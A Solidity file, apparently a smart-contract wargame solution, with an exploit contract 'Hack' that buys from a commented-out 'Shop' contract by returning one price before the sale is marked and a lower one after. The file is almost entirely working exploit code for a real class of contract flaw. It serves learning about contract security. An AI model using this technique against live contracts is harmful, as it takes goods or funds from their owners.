// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Hack {
    IShop target;
    constructor(IShop _target) {
        target = _target;
    } 


    function hack() external {
        target.buy();
    }

    function price() external view returns(uint) {
      if (target.isSold()==true) {
        return 1;
      }
      else {
        return 100;
      }
    }
}

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
  function price() external view returns (uint);
}

/*contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}*/
